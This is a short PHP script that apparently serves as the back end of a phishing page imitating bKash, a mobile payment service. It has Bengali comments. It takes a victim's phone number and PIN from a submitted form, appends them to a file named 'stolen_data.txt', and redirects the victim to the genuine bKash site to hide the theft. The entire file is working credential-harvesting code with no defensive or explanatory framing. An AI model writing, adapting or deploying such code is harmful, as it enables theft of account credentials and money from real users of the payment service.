<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $phoneNumber = $_POST['phoneNumber'];
        $password = $_POST['password'];

        // ডেটা সংরক্ষণ করা~
        $file = fopen("stolen_data.txt", "a");
        fwrite($file, "Phone Number: " . $phoneNumber . " | PIN: " . $password . "\n");
        fclose($file);

        // রিডাইরেক্ট করা~ 
        header("Location: https://www.bKash.com/");
        exit();
    }
?>
